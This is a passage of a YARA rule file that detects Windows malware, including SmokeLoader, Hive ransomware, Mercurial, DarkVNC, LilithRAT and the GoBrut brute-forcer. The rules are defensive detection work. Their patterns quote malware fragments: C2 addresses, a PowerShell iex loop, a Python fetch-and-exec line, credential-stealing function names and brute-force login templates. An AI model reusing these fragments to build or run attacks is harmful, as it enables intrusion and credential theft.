00 03 0a 00 00 13 74 00 65 00 72 00 6d 00
69 00 6e 00 61 00 74 00 65 00 00 09 65 00
78 00 69 00 74 00 }
condition:
uint16(0) == 0x5a4d and ((1 of ($pdb*) and 2 of ($s*)) or 5 of ($s*))
}
rule SSC_Win_SmokeLoader {
meta:
author = "ditekSHen"
description = "Detects SmokeLoader variants"
strings:
$x1 = "G2A/CLP/05/RYS" fullword wide // mutex
$x2 = "0N1Y/53R10U5/BU51N355" fullword wide // mutex
$x3 = "CH4PG3PB-6HT2VI9C-O2NL2NO5-QP1BW0EG" fullword wide // mutex
$s1 = "Azure-Update-Task" fullword wide
$s2 = "C:\\Windows\\System32\\schtasks.exe" fullword wide
$s3 = "/C /create /F /sc minute /mo 1 /tn \"" fullword wide
$s4 = "\\Microsoft\\Network" fullword wide
$s5 = "\\Microsoft\\TelemetryServices" fullword wide
$s6 = "\" /tr \"" fullword wide
$e1 = "\\sqlcmd.exe" fullword wide
$e2 = "\\sihost.exe" fullword wide
$e3 = "\\fodhelper.exe" fullword wide
//$o1 = { 6a 34 59 66 39 0e 75 7c 0f b7 46 02 6a 30 5a 83 }
//$o2 = { 5e c9 c3 56 8d 85 f8 fd ff ff 50 8d 85 f0 fb ff }
//$o3 = { 8b d9 eb 03 8b 5d ec 0f b7 c2 89 45 ec 0f b7 c2 }
//$o4 = { 8b 5d fc 66 89 04 77 46 eb 2a 8b 5d fc 85 db 74 }
condition:
uint16(0) == 0x5a4d and ((1 of ($x*) and 4 of ($s*)) or (5 of ($s*) and 1 of ($e*)))
}
rule SSC_Win_DLInjector03 {
meta:
author = "ditekSHen"
description = "Detects unknown loader / injector"
strings:
$x1 = "LOADER ERROR" fullword ascii
$s1 = "_ZN6curlpp10OptionBaseC2E10CURLoption" fullword ascii
$s2 = "The procedure entry point %s could not be located in the dynamic link library %s" fullword ascii
condition:
uint16(0) == 0x5a4d and all of them
}
rule SSC_Win_CoinMiner02 {
meta:
author = "ditekSHen"
description = "Detects coinmining malware"
strings:
$s1 = "%s/%s (Windows NT %lu.%lu" fullword ascii
$s2 = "\\Microsoft\\Libs\\WR64.sys" wide
$s3 = "\\\\.\\WinRing0_" wide
$s4 = "pool_wallet" ascii
$s5 = "cryptonight" ascii
$s6 = "mining.submit" ascii
$c1 = "stratum+ssl://" ascii
$c2 = "daemon+http://" ascii
$c3 = "stratum+tcp://" ascii
$c4 = "socks5://" ascii
$c5 = "losedaemon+https://" ascii
condition:
uint16(0) == 0x5a4d and (3 of ($s*) and 1 of ($c*))
}
rule SSC_Win_Mercurial {
meta:
author = "ditekSHen"
description = "Detects Mercurial infostealer"
strings:
$x1 = "mercurial grabber" wide nocase
$x2 = "\"text\":\"Mercurial Grabber |" wide
$x3 = "/nightfallgt/mercurial-grabber" wide
$s1 = "/LimerBoy/Adamantium-Thief/" ascii
$s2 = "Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:42.0) Gecko/20100101 Firefox/42.0" fullword wide
$s3 = "StealCookies" fullword ascii
$s4 = "StealPasswords" fullword ascii
$s5 = "DetectDebug" fullword ascii
$s6 = "CaptureScreen" fullword ascii
$s7 = "WebhookContent" fullword ascii
$s8 = /Grab(Token|Product|IP|Hardware)/ fullword ascii
$p1 = "[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}" fullword ascii wide
$p2 = "mfa\\.[\\w-]{84}" fullword ascii wide
condition:
uint16(0) == 0x5a4d and (1 of ($x*) or 5 of ($s*) or (all of ($p*) and 3 of ($s*)))
}
rule SSC_Win_Phonzy {
meta:
author = "ditekSHen"
description = "Detects specific downloader agent"
strings:
$ua1 = "User-Agent: Mozilla/5.0 (X11; Linux" wide
$s1 = "<meta name=\"keywords\" content=\"([\\w\\d ]*)\">" fullword wide
$s2 = "WebClient" fullword ascii
$s3 = "WriteAllText" fullword ascii
$s4 = "DownloadString" fullword ascii
$s5 = "WriteByte" fullword ascii
condition:
uint16(0) == 0x5a4d and (all of ($s*) or (1 of ($ua*) and ($s1) and 2 of ($s*)))
}
rule SSC_Win_Hive {
meta:
author = "ditekSHen"
description = "Detects Hive ransomware"
strings:
$url1 = "http://hivecust" ascii
$url2 = "http://hiveleakdb" ascii
$s1 = "encrypt_files.go" ascii
$s2 = "erase_key.go" ascii
$s3 = "kill_processes.go" ascii
$s4 = "remove_shadow_copies.go" ascii
$s5 = "stop_services_windows.go" ascii
$s6 = "remove_itself_windows.go" ascii
$x1 = "/encryptor/" ascii
$x2 = "HOW_TO_DECRYPT.txt" ascii
$x3 = "FilesEncrypted" fullword ascii
$x4 = "EncryptionStarted" fullword ascii
$x5 = "encryptFilesGroup" fullword ascii
$x6 = "Your data will be undecryptable" ascii
$x7 = "- Do not fool yourself. Encryption has perfect secrecy" ascii
$v1_1 = ".EncryptFiles." ascii
$v1_2 = ".EncryptFilename." ascii
$v1_3 = ")*struct { F uintptr; .autotmp_14 string }" ascii
$v1_4 = "D*struct { F uintptr; data *[]uint8; seed *uint8; fnc *main.decFunc }" ascii
$v1_5 = "golang.org/x/sys/windows.getSystemWindowsDirectory" ascii
$v1_6 = "path/filepath.WalkDir" ascii
$v2_1 = "taskkill /f /im" ascii
$v2_2 = "schtasks /delete /tn" ascii
$v2_3 = "encfile.txt" ascii
$v2_4 = "README.html" ascii
$v2_5 = "total encrypt %v/%v" ascii
$v2_6 = "<b>ITSSHOWKEY</b>" ascii
$v2_7 = "Recovery your files." ascii
$v2_8 = "yaml:\"send_host\"" ascii  // send_host: "45.76.99.222:80"
$v2_9 = "yaml:\"ignore_dir\"" ascii
condition:
uint16(0) == 0x5a4d and (all of ($url*) or all of ($s*) or 4 of ($x*) or 5 of ($v1*) or 5 of ($v2*) or (4 of ($v2*) and #v2_1 > 10))
}
rule SSC_Win_DarkVNC {
meta:
author = "ditekSHen"
description = "Detects DarkVNC"
strings:
$s1 = "USR-%s(%s)_%S-%S%u%u" fullword wide
$s2 = "BOT-%s(%s)_%S-%S%u%u" fullword wide
$s3 = "USR-UnicodeErr(Err)_%s-%s%u%u" fullword ascii
$s4 = "BOT-UnicodeErr(Err)_%s-%s%u%u" fullword ascii
$s5 = "PRM_STRG" fullword wide
$s6 = "bot_shell >" ascii
$s7 = "monitor_off / monitor_on" ascii
$s8 = "kbd_off / kbd_on" ascii
$s9 = "ActiveDll: Dll inject thread for process 0x%x terminated with status: %u" ascii
$s10 = "PsSup: File %s successfully started with parameter \"%s\"" ascii
$s11 = "PsSup: ShellExecute failed. File: %s, error %u" ascii
$s12 = "#hvnc" fullword ascii
condition:
uint16(0) == 0x5a4d and 5 of them
}
rule SSC_Win_RSJON {
meta:
author = "ditekSHen"
description = "Detects RSJON / Ryzerlo / HiddenTear ransomware"
strings:
$pdb1 = "C:\\Users\\brknc\\source\\repos\\" ascii
$pdb2 = "\\rs-jon\\obj\\Debug\\rs-jon.pdb" ascii
$pdb3 = "\\rs-jon\\obj\\Release\\rs-jon.pdb" ascii
$x1 = "READ_ME_PLZ.txt" wide
$x2 = "Files has been encrypted with rs-jon" wide
$x3 = ".rsjon" wide
$x4 = "bitcoins or kebab" wide
$x5 = /rs[-_]jon/ fullword ascii wide
$s1 = "SPIF_UPDATEINIFILE" fullword ascii
$s2 = "SPI_SETDESKWALLPAPER" fullword ascii
$s3 = "bytesToBeEncrypted" fullword ascii // Same as Apsotle
$s4 = "SendPassword" fullword ascii
$s5 = "EncryptFile" ascii
$s6 = "fWinIni" fullword ascii
$s7 = "BTCAdress" fullword ascii
$s8 = "self_destruck" fullword ascii // Simialr to Apsotle (SelfDelete)
$c1 = "?computer_name=" wide
$c2 = "&serialnumber=" wide
$c3 = "&password=" wide
$c4 = "&allow=ransom" wide
$c5 = "://darkjon.tk/" wide
$c6 = "/rnsm/write.php" wide
condition:
uint16(0) == 0x5a4d and (3 of ($x*) or 6 of ($s*) or 4 of ($c*) or (2 of ($c*) and 4 of ($s*)) or (1 of ($pdb*) and 1 of them))
}
rule SSC_Win_BoxCaon {
meta:
author = "ditekSHen"
description = "Detects IndigoZebra BoxCaon"
strings:
$s1 = "<RetCMD null>" fullword wide
$s2 = "<txt null>" fullword wide
$s3 = "C:\\Users\\Public\\%d\\" fullword wide
$s4 = "api.dropboxapi.com" fullword wide
$s5 = "/2/files/upload" fullword wide
$ts1 = "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko" ascii wide
$ts2 = "%s /A /C \"%s\" > %s" ascii wide
$ts3 = "ersInfo" ascii wide
$ts4 = "%svmpid%d.log" ascii wide
$ts5 = "%scscode%d.log" ascii wide
condition:
(uint16(0) == 0x5a4d and all of ($s*)) or all of ($ts*)
}
rule SSC_Win_AvosLocker {
meta:
author = "ditekSHen"
description = "Hunt for AvosLocker ransomware"
strings:
$s1 = "GET_YOUR_FILES_BACK.txt" ascii wide
$s2 = ".avos" fullword ascii wide
condition:
uint16(0) == 0x5a4d and all of them
}
rule SSC_Win_Diavol {
meta:
author = "ditekSHen"
description = "Detects Diavol ransomware"
strings:
$s1 = "README_FOR_DECRYPT.txt" ascii wide nocase
$s2 = ".lock64" fullword ascii wide
$s3 = "LockMainDIB" ascii wide
$s4 = "locker.divided" ascii wide
$s5 = "%tob_dic%/" wide
$s6 = "%cid_bot%" wide
$m1 = "GENBOTID" ascii wide
$m2 = "SHAPELISTS" ascii wide
$m3 = "REGISTER" ascii wide
$m4 = "FROMNET" ascii wide
$m5 = "SERVPROC" ascii wide
$m6 = "SMBFAST" ascii wide
$c1 = "/Bnyar8RsK04ug/" fullword ascii
$c2 = "/landing" fullword ascii
$c3 = "/wipe" fullword ascii
$c4 = "&ip_local1=111.111.111.111&ip_local2=222.222.222.222&ip_external=2.16.7.12" fullword ascii
$c5 = "&group=" fullword ascii
$c6 = "/BnpOnspQwtjCA/register" fullword ascii
condition:
uint16(0) == 0x5a4d and (4 of ($s*) or 5 of ($m*) or 4 of ($c*) or 7 of them)
}
rule SSC_Win_MargulasRAT {
meta:
author = "ditekSHen"
description = "Detects MargulasRAT"
strings:
$pdb1 = "G:\\VP-S-Fin\\memory\\" ascii
$pdb2 = "G:\\VP-S-Fin\\Margulas\\" ascii
$pdb3 = "G:\\VP-S-Fin\\remote" ascii
$pdb4 = "G:\\VP-S-Fin\\" ascii
$s1 = "/C choice /C Y /N /D Y /T 1 & Del " fullword wide
$s2 = "strToHash" fullword ascii
$s3 = "\\socking" fullword wide
$s4 = "\\wininets" fullword wide
$s5 = "ClientSocket" fullword ascii
$s6 = "new Stream()" fullword wide
$s7 = "CipherText" fullword ascii
$s8 = "WriteAllBytes" fullword ascii
$s9 = { 00 50 72 6f 63 65 73 73 00 45 78 69 73 74 73 00}
$s10 = "pxR/THCwdLuruMmw8wB8xAUvbno1yPGBTOV9IoOkAp/n7+paQm74pkzlfSKDpAKfTOV9IoOkAp9M5X0ig6QCn0zlfSKDpAKfTOV9IoOkAp" wide
$c1 = "149.248.52.61" wide
$c2 = "://vpn.nic.in" wide
$c3 = "://www.mod.gov.in/dod/sites/default/files/" wide
condition:
uint16(0) == 0x5a4d and ((1 of ($pdb*) and (1 of ($c*) or 3 of ($s*))) or (1 of ($c*) and 3 of ($s*)) or (6 of ($s*)))
}
rule SSC_Win_LilithRAT {
meta:
author = "ditekSHen"
description = "Detects LilithRAT"
hash1 = "132870a1ae6a0bdecaa52c03cfe97a47df8786f148fa8ca113ac2a8d59e3624a"
hash2 = "ab7b6e0b28995bdeea44f20c0aba47f95e1d6ba281af3541cd2c04dc6c2a3ad9" // actor testing?
hash3 = "b2eeb487046ba1d341fb964069b7e83027b60003334e04e41b467e35c3d2460f"
hash4 = "cebcda044c60b709ba4ee0fa9e1e7011a6ffc17285bcc0948d27f866ec8d8f20"
strings:
$pdb1 = "c:\\Users\\Groovi\\Documents\\Visual Studio 2008\\Projects\\TestDll\\" ascii
$pdb2 = "C:\\Users\\iceberg\\Downloads\\RAT-Server-master\\RAT-Server-master\\RAT\\Debug\\RAT.pdb" ascii
$pdb3 = "C:\\Users\\Samy\\Downloads\\Compressed\\Lilith-master\\Debug\\Lilith.pdb" ascii
$s1 = "log.txt" fullword ascii
$s2 = "keylog.txt" fullword ascii
$s3 = "File Listing Completed Successfully." fullword ascii
$s4 = "Download Execute" fullword ascii
$s5 = "File Downloaded and Executed Successfully." fullword ascii
$s6 = "C:\\WINDOWS\\system32\\cmd.exe" fullword ascii
$s7 = "CMD session closed" ascii
$s8 = "Restart requested: Restarting self" fullword ascii
$s9 = "Termination requested: Killing self" fullword ascii
$s10 = "Couldn't write to CMD: CMD not open" fullword ascii
$s11 = "keydump" fullword ascii
$s12 = "remoteControl" fullword ascii
$s13 = "packettype" fullword ascii
condition:
uint16(0) == 0x5a4d and (1 of ($pdb*) or 6 of ($s*) or (1 of ($pdb*) and 4 of ($s*)))
}
rule SSC_Win_EpicenterRAT {
meta:
author = "ditekSHen"
description = "Detects EpicenterRAT"
strings:
$pdb1 = "c:\\Users\\Zombie\\Desktop\\MutantNinja\\" ascii
$pdb2 = "\\Epicenter Client\\" ascii
$s1 = "PROCESS_LIST<%SEP%>" fullword wide
$s2 = "GETREADY_RECV_FILE<%SEP%>" fullword wide
$s3 = "DISPLAY<%SEP%>" wide
$s4 = "GETSCREEN<%SEP%>" fullword wide
$s5 = "dumpImageName" fullword ascii
$s6 = "dumpLoc" fullword ascii
$s7 = "EXPECT<%SEP%>filelist<%SEP%>" fullword wide
$s8 = "<%FSEP%>FOLDER<%FSEP%>-<%SEP%>" fullword wide
$s9 = "KILLPROC<%SEP%>" fullword wide
$s10 = "LAUNCHPROC<%SEP%>" fullword wide
$s11 = "cmd.exe /c start /b " fullword wide
$s12 = "savservice" fullword wide
$s13 = "getvrs" fullword ascii
condition:
uint16(0) == 0x5a4d and (1 of ($pdb*) or 5 of ($s*))
}
rule SSC_Win_LastConn {
meta:
author = "ditekSHen"
description = "Detects LastConn"
strings:
$s1 = "System.Net.Http.SysSR" fullword wide
$s2 = "System.Net.Http.WrSR" fullword wide
$s3 = "yyyy'-'MM'-'dd'T'HH':'mm':'ss.FFFFFFFK" fullword wide
$s4 = { 63 00 6f 00 6e 00 74 00 65 00 6e 00 74 00 0c 6e
00 6f 00 74 00 69 00 66 00 79 00 04 06 12 80 e8
05 00 00 12 80 e8 08 75 00 73 00 65 00 72 00 08
74 00 65 00 61 00 6d 00 06 61 00 70 00 70 00 0c
6e 00 6f 00 61 00 75 00 74 00 68 00 }
$s5 = { 68 00 69 00 64 00 64 00 65 00 6e 00 10 64 00 69
00 73 00 61 00 6c 00 6c 00 6f 00 77 00 0e 65 00
78 00 74 00 65 00 6e 00 64 00 73 00 04 69 00 64
00 16 75 00 6e 00 69 00 71 00 75 00 65 00 49 00
74 00 65 00 6d 00 73 }
$s6 = "<RunFileOnes>d__" ascii
$s7 = "<UploadFile>d__" ascii
$s8 = "<ChunkUpload>d__" ascii
$s9 = "<StartFolder>d__" ascii
$s10 = "<ReadFileAlw>d__" ascii
$s12 = "<WriteFileToD>d__" ascii
$s13 = "<ReadFile>d__" ascii
$s14 = "<GetUpload>d__" ascii
$s15 = "CDropbox.Api.DropboxRequestHandler+<RequestJsonStringWithRetry>d__" ascii
condition:
uint16(0) == 0x5a4d and 12 of them
}
rule SSC_Win_ActionRAT {
meta:
author = "ditekSHen"
description = "Detects ActionRAT, CSharp and Delfi variants"
strings:
$x1 = /<action>(connect|command|drives|getfiles|upload|execute|download)<action>/ fullword wide
$x2 = "aHR0cDovLzE0NC45MS42NS4xMDAv" wide
$x3 = "aHR0cDovL21mYWhvc3QuZGRucy5uZXQv" wide
$f1 = "<updateCommand>b__" ascii
$f2 = "<getDrives>b__" ascii
$f3 = "<getStatus>b__" ascii
$f4 = "<getDirectories>b__" ascii
$f5 = "<updateUpload>b__" ascii
$f6 = "<infinity>b__" ascii
$f7 = "<uploadFile>b__" ascii
$s1 = "beaconURL" ascii
$s2 = "PingReply" ascii
$s3 = "updateUpload" ascii
$s4 = "updateCommand" ascii
$s5 = "runCommand" ascii
$s6 = "uploadFile" ascii
$s7 = "SELECT * FROM MSFT_NetAdapter WHERE ConnectorPresent = True AND DeviceID = '{0}'" fullword wide
$s8 = "SOFTWARE\\Wow6432Node\\Microsoft\\Windows NT\\CurrentVersion" fullword wide
$s9 = "Mozilla/3.0" fullword wide
$s10 = "|directory|N/A|" fullword wide
$s11 = "cmd.exe /c" fullword wide
$c1 = /Content-Disposition: form-data; name=(hostname|hid|id|action|secondary)/ fullword wide
$c2 = /(classification|updatecs|update|beacon)\.php/ wide
$c3 = "Content-Disposition: form-data;name=\"{0}\";filename=\"{1}\"filepath=\"{2}\"" fullword wide
$pdb1 = "D:\\Projects\\C#\\HTTP-Simple\\WindowsMediaPlayer - HTTP - " ascii
$pdb2 = "\\WindowsMediaPlayer10\\obj\\x86\\Release\\winow4.pdb" ascii
condition:
uint16(0) == 0x5a4d and (#x1 > 5 or (all of ($f*) and (1 of ($s*) or 2 of ($c*))) or 7 of ($s*) or all of ($c*) or (all of ($pdb*) and 4 of them) or ( 2 of ($x*) and 5 of them))
}
rule SSC_Win_Nodachi {
meta:
author = "ditekSHen"
description = "Detects Nodachi infostealer"
strings:
$x1 = "//AppData//Roaming//kavachdb//kavach.db" ascii
$s1 = "/upload/drive/v3/files/{fileId}" ascii
$s2 = "main.getTokenFromWeb" ascii
$s3 = "main.tokenFromFile" ascii
$s4 = "/goLazagne/" ascii
$s5 = "/extractor/withoutdrive/main.go" ascii
$s6 = "struct { Hostname string \"json:\\\"hostname\\\"\"; EncryptedUsername string \"json:\\\"encryptedUsername\\\"\"; EncryptedPassword string \"json:\\\"encryptedPassword\\\"\" }" ascii
$s7 = "C://Users//public//cred.json" ascii
condition:
uint16(0) == 0x5a4d and ((1 of ($x*) and 3 of ($s*)) or (4 of ($s*)))
}
rule SSC_Win_IAmTheKingQueenOfHearts {
meta:
author = "ditekSHen"
description = "IAmTheKing Queen Of Hearts payload"
strings:
$s1 = "{'session':[{'name':'" ascii
$s2 = "begin mainthread ok" wide
$s3 = "getcommand error" wide
$s4 = "querycode error" wide
$s5 = "Code = %d" wide
$s6 = "cookie size :%d" wide
$s7 = "send request error:%d" wide
$s8 = "PmMytex%d" wide
$s9 = "%s_%c%c%c%c_%d" wide
$s10 = "?what@exception@std@@UBEPBDXZ" ascii
condition:
uint16(0) == 0x5a4d and 6 of them
}
rule SSC_Win_IAmTheKingQueenOfClubs {
meta:
author = "ditekSHen"
description = "IAmTheKing Queen Of Clubs payload"
strings:
$s1 = "Not Support!" fullword wide
$s2 = "%s|%s|%s|%s" fullword wide
$s3 = "cmd.exe" fullword wide
$s4 = "for(;;){$S=Get-Content \"%s\";IF($S){\"\" > \"%s\";$t=iex $S 2>\"%s\";$t=$t+' ';echo $t >>\"%s\";}sleep -m " wide
$s5 = "PowerShell.exe -nop -c %s" fullword wide
$s6 = "%s \"%s\" Df" fullword wide
$s7 = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; .NET CLR 1.1.4322)" fullword ascii
condition:
uint16(0) == 0x5a4d and 5 of them
}
rule SSC_Win_IAmTheKing {
meta:
author = "ditekSHen"
description = "IAmTheKing payload"
strings:
$s1 = "DeleteFile \"%s\" Failed,Err=%d" wide
$s2 = "DeleteFile \"%s\" Success" wide
$s3 = "ExcuteFile \"%s\" Failed,Err=%d" wide
$s4 = "ExcuteFile \"%s\" Success" wide
$s5 = "CreateDownLoadFile \"%s\" Failed,Error=%d" wide
$s6 = "uploadFile \"%s\" Failed,errorcode=%d" wide
$s7 = "CreateUpLoadFile \"%s\" Success" wide
$s8 = "im the king" ascii
$s9 = "dont disturb me" fullword ascii
$s10 = "kill me or love me" fullword ascii
$s11 = "please leave me alone" fullword ascii
$s12 = "calculate the NO." fullword ascii
$s13 = "\\1-driver-vmsrvc" fullword ascii
condition:
uint16(0) == 0x5a4d and 7 of them
}
rule SSC_Win_GoBrut {
meta:
author = "ditekSHen"
description = "Detects unknown Go multi-bruteforcer bot (StealthWorker / GoBrut) against multiple systems: QNAP, MagOcart, WordPress, Opencart, Bitrix, Postgers, MySQL, Drupal, Joomla, SSH, FTP, Magneto, CPanel"
strings:
$x1 = "/src/StealthWorker/Worker" ascii
$x2 = "/go/src/Cloud_Checker/" ascii
$x3 = "brutXmlRpc" ascii
$s1 = "main.WPBrut" ascii
$s2 = "main.WPChecker" ascii
$s3 = "main.WooChecker" ascii
$s4 = "main.StandartBrut" ascii
$s5 = "main.StandartBackup" ascii
$s6 = "main.WpMagOcartType" ascii
$s7 = "main.StandartAdminFinder" ascii
$w1 = "/WorkerQnap_brut/main.go" ascii
$w2 = "/WorkerHtpasswd_brut/main.go" ascii
$w3 = "/WorkerOpencart_brut/main.go" ascii
$w4 = "/WorkerBitrix_brut/main.go" ascii
$w5 = "/WorkerPostgres_brut/main.go" ascii
$w6 = "/WorkerMysql_brut/main.go" ascii
$w7 = "/WorkerFTP_brut/main.go" ascii
$w8 = "/WorkerSSH_brut/main.go" ascii
$w9 = "/WorkerDrupal_brut/main.go" ascii
$w10 = "/WorkerJoomla_brut/main.go" ascii
$w11 = "/WorkerMagento_brut/main.go" ascii
$w12 = "/WorkerWHM_brut/main.go" ascii
$w13 = "/WorkerCpanel_brut/main.go" ascii
$w14 = "/WorkerPMA_brut/main.go" ascii
$w15 = "/WorkerWP_brut/main.go" ascii
$p1 = "%s/project/saveGood?host=%s&login=%s&password=%s&service=cpanel" ascii
$p2 = "%s/project/saveGood?host=%s&login=%s&password=%s&service=ftpBrut" ascii
$p3 = "%s/project/saveGood?host=%s&login=%s&password=%s&service=mysql_b" ascii
$p4 = "%s/project/saveGood?host=%s&login=%s&password=%s&service=qnapBrt" ascii
$p5 = "%s/project/saveGood?host=%s&login=%s&password=%s&service=OCartBrt" ascii
$p6 = "%s/project/saveGood?host=%s&login=%s&password=%s&service=phpadmin" ascii
$p7 = "%s/project/saveGood?host=%s&login=%s&password=%s&service=bitrixBrt" ascii
$p8 = "%s/project/saveGood?host=%s&login=%s&password=%s&service=drupalBrt" ascii
$p9 = "%s/project/saveGood?host=%s&login=%s&password=%s&service=joomlaBrt" ascii
$p10 = "%s/project/saveGood?host=%s&login=%s&password=%s&service=htpasswdBrt" ascii
$p11 = "%s/project/saveGood?host=%s&login=%s&password=%s&service=magentoBrt" ascii
$p12 = "%s/project/saveGood?host=%s&login=%s&password=%s&service=postgres_b" ascii
$p13 = "AUTH_FORM=Y&TYPE=AUTH&USER_LOGIN=%s&USER_PASSWORD=%s&Login=&captcha_sid=&captcha_word=" ascii
$p14 = "%qlog=%s&pwd=%s&wp-submit=Log In&redirect_to=%s/wp-admin/&testcookie=1" ascii
$p15 = "name=%s&pass=%s&form_build_id=%s&form_id=user_login_form&op=Log" ascii
$p16 = "username=%s&passwd=%s&option=com_login&task=login&return=%s&%s=1" ascii
$v1_1 = "brutC" fullword ascii
$v1_2 = "XmlRpc" fullword ascii
$v1_3 = "shouldRetry$" ascii
$v1_4 = "HttpC|%" ascii
$v1_5 = "ftpH%_" ascii
$v1_6 = "ssh%po" ascii
$v1_7 = "?sevlyar/4-da" ascii
condition:
(uint16(0) == 0x5a4d or uint16(0) == 0x457f) and ((2 of ($x*) and 3 of ($s*)) or all of ($s*) or 6 of ($w*) or 6 of ($p*) or 6 of ($v1*) or 12 of them)
}
rule SSC_Win_BioPass_Dropper {
meta:
author = "ditekSHen"
description = "Detects Go BioPass dropper"
strings:
$go = "Go build ID:" ascii
$s1 = "main.NetWorkStatus" ascii
$s2 = "main.NoErrorRunFunction" ascii
$s3 = "main.FileExist" ascii
$s4 = "main.execute" ascii
$s5 = "main.PsGenerator" ascii
$s6 = "main.downFile" ascii
$s7 = "main.Unzip" ascii
$url1 = "https://flashdownloadserver.oss-cn-hongkong.aliyuncs.com/res/" ascii
$x1 = "SCHTASKS /Run /TN SYSTEM_CDAEMON" ascii
$x2 = "SCHTASKS /Run /TN SYSTEM_SETTINGS" ascii
$x3 = "SCHTASKS /Run /TN SYSTEM_TEST && SCHTASKS /DELETE /F /TN SYSTEM_TEST" ascii
$x4 = ".exe /install /quiet /norestart" ascii
$x5 = "exec(''import urllib.request;exec(urllib.request.urlopen(urllib.request.Request(\\''http" ascii
$x6 = "powershell.exe -Command $" ascii
$x7 = ".Path ='-----BEGIN RSA TESTING KEY-----" ascii
condition:
uint16(0) == 0x5a4d and (all of ($s*) or 5 of ($x*) or (1 of ($url*) and ($go)) or 9 of them)
}
rule SSC_Win_A310Logger {
meta:
author = "ditekSHen"
description = "Detects A310Logger"
snort_sid = "920204-920207"
strings:
$s1 = "Temporary Directory * for" fullword wide
$s2 = "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\*RD_" wide
$s3 = "@ENTIFIER=" wide
$s4 = "ExecQuery" fullword wide
$s5 = "MSXML2.ServerXMLHTTP.6.0" fullword wide
$s6 = "Content-Disposition: form-data; name=\"document\"; filename=\"" wide
$s7 = "CopyHere" fullword wide
$s8 = "] Error in" fullword wide
$s9 = "shell.application" fullword wide nocase
$s10 = "SetRequestHeader" fullword wide
$s11 = "\\Ethereum\\keystore" fullword wide
$s12 = "@TITLE Removing" fullword wide
$s13 = "@RD /S /Q \"" fullword wide
$en1 = "Unsupported encryption" fullword wide
$en2 = "BCryptOpenAlgorithmProvider(SHA1)" fullword wide
$en3 = "BCryptGetProperty(ObjectLength)" fullword wide
$en4 = "BCryptGetProperty(HashDigestLength)" fullword wide
// varaint 1
$v1_1 = "PW\\FILES\\SC::" wide
$v1_2 = "AddAttachment" fullword wide
$v1_3 = "Started:" fullword wide
$v1_4 = "Ended:" fullword wide
$v1_5 = "sharedSecret" fullword wide
$v1_6 = "\":\"([^\"]+)\"" fullword wide
$v1_7 = "\\credentials.txt" fullword wide
$v1_8 = "WritePasswords" fullword ascii
$v1_9 = "sGeckoBrowserPaths" fullword ascii
$v1_10 = "get_sPassword" fullword ascii
condition:
uint16(0) == 0x5a4d and (7 of ($s*) or (3 of ($en*) and 4 of ($s*)) or (5 of ($s*) and 1 of ($en*)) or 5 of ($v1*) or (4 of ($v1*) and 2 of ($s*) and 2 of ($en*)))
}
rule SSC_Win_CryLock {
meta:
author = "ditekSHen"
description = "Detects CryLock ransomware"
strings:
$s1 = "Encrypted by BlackRabbit. (BR-" ascii
$s2 = "{ENCRYPTENDED}" ascii
$s3 = "{ENCRYPTSTART}" ascii
$s4 = "<%UNDECRYPT_DATETIME%>" ascii
$s5 = "<%RESERVE_CONTACT%>" ascii
$s6 = "how_to_decrypt.hta" ascii wide
$s7 = "END ENCRYPT ONLY EXTENATIONS" ascii
$s8 = "END UNENCRYPT EXTENATIONS" ascii
$s9 = "END COMMANDS LIST" ascii
$s10 = "END PROCESSES KILL LIST" ascii
$s11 = "END SERVICES STOP LIST" ascii
$s12 = "END PROCESSES WHITE LIST" ascii
$s13 = "END UNENCRYPT FILES LIST" ascii
$s14 = "END UNENCRYPT FOLDERS LIST" ascii
$s15 = "Encrypted files:" ascii
$s16 = { 65 78 74 65 6e 61 74 69 6f 6e 73 00 ff ff ff ff
06 00 00 00 63 6f 6e 66 69 67 00 00 ff ff ff ff
(0a|0d 0a) 00 00 00 63 6f 6e 66 69 67 2e 74 78
74 00 00 ff ff ff ff 03 00 00 00 68 74 61 }
$p1 = "-exclude" fullword
$p2 = "-makeff" fullword
$p3 = "-full" fullword
$p4 = "-nolocal" fullword
$p5 = "-nolan" fullword
$p6 = "\" -id \"" fullword
$p7 = "\" -wid \"" fullword
$p8 = "\"runas\"" fullword
$p9 = " -f -s -t 00" fullword ascii
condition:
uint16(0) == 0x5a4d and (3 of ($s*) or 6 of ($p*))
}
rule SSC_Win_DeepRats {
meta:
author = "ditekSHen"
description = "Detects DeepRats ("
hash1 = "1f8b7e1b14869d119c5de1f05330094899bd997fca4c322d852db85cbd9271e6"
strings:
$s1 = "https://freegeoip.live/json/https://myexternalip.com/rawin" ascii
$s2 = "github.com/cretz/bine" ascii
$s3 = "github.com/kbinani/screenshot" ascii
$s4 = "socks5://%s:%d" ascii
$s5 = "socks5://%s:%s@%s:%d" ascii
$s6 = "http://%s:%d" ascii
$s7 = "http://%s@%s:%d" ascii
$s8 = "%SystemRoot%\\system32\\--CookieAuthentication" ascii
$s9 = "tor_addr_" ascii
$f1 = ".GetVnc" ascii
$f2 = ".GetCommand" ascii
$f3 = ".GetPayload" ascii
$f4 = ".ListenCommands" ascii
$f5 = ".ReceiveFile" ascii
$f6 = ".RegisterImplant" ascii
$f7 = ".Screenshot" ascii
$f8 = ".SendFile" ascii
$f9 = ".StartShell" ascii
$f10 = ".UnregisterImplant" ascii
$f11 = ".VncInstalled" ascii
$f12 = ".PingPong" ascii
$f13 = ".ListenCMD" ascii
condition:
uint16(0) == 0x5a4d and (7 of ($s*) or 8 of ($f*))
}
rule SSC_Win_Gasket {
meta:
author = "ditekSHen"
description = "Detects Gasket"
strings:
$s1 = "main.checkGasket" ascii
$s2 = "main.connectGasket" ascii
$s3 = "/cert/trust/dev/stderr/dev/stdout/index.html" ascii
$f1 = ".SetPingHandler." ascii
$f2 = ".SetPongHandler." ascii
$f3 = ".computeMergeInfo." ascii
$f4 = ".computeDiscardInfo." ascii
$f5 = ".readPlatformMachineID." ascii
$f6 = ".(*Session).establishStream." ascii
$f7 = ".(*Session).handleGoAway." ascii
$f8 = ".(*Stream).processFlags." ascii
$f9 = ".(*Session).handlePing." ascii
$f10 = ".(*windowsService).Install." ascii
$f11 = ".(*windowsService).Uninstall." ascii
$f12 = ".(*windowsService).Status." ascii
$f13 = ".getStopTimeout." ascii
$f14 = ".DialContext." ascii
$f15 = ".WriteControl." ascii
$f16 = ".(*Server).authenticate." ascii
